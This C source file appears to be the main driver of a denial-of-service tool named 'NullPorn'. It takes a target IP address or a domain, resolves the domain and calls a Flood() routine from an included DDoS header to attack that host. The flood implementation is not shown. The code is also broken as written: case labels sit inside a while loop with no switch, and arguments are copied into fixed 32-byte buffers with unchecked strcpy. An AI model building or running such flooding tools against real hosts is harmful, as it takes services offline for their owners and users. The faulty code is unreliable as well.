#include "FileUtils.h"
#include "DDoS.h"

int main(int argc, char* argv[])
{
    char filepath[32];
    char* fileBuffer;

    int option = 0;
    while ((option = getopt(argc, argv, "d:D:i:I")) != -1)
    {
    case 'i': {
            char ip[32];
            strcpy(ip, optarg);
            Flood(ip);
            return 0;
        } break;
    case 'd': {
            char domain[32];
            strcpy(domain, optarg);
            char* ip = DNSLookup(domain); 
            Flood(ip);
            free(ip);
            return 0;
        } break;

    case 'D': break; // TODO
    case 'I': break; // TODO
                     
    default: {
            fprintf(stderr, "[USAGE]: \"sudo ./NullPorn -[iIdD] [arguments]\".\n");
            return -1;
         } break;
    }

    bool fileRead = false;

    if (fileRead)
        free(fileBuffer);
}
